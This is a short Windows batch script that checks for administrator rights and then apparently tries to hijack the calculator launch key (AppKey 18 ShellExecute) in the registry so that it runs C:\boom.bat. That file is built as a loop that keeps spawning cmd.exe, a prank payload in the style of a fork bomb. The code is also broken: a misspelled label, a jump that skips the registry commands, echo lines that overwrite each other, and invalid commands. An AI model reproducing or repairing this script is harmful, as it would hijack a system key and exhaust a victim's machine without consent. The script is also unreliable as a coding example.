@echo off

goto check_Permissions

:check_Permissions
echo Administrative permissions required. Detecting permissions...

net session >nul 2>&1
if %errorLevel% == 0 (
    echo Success: Administrative permissions confirmed.
    goto modify_registery
) else (
    echo Failure: Current permissions inadequate.
    pause 3
    exit
)

:modify_registry
goto boom
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute /t REG_SZ /d C:\boom.bat /f
pause 1

:boom
cd \
del boom.bat
echo :top > boom.bat
echo cmd.exe > boom.bat
echo goto top > boom.bat
cd -



echo should be good!
pause>nul
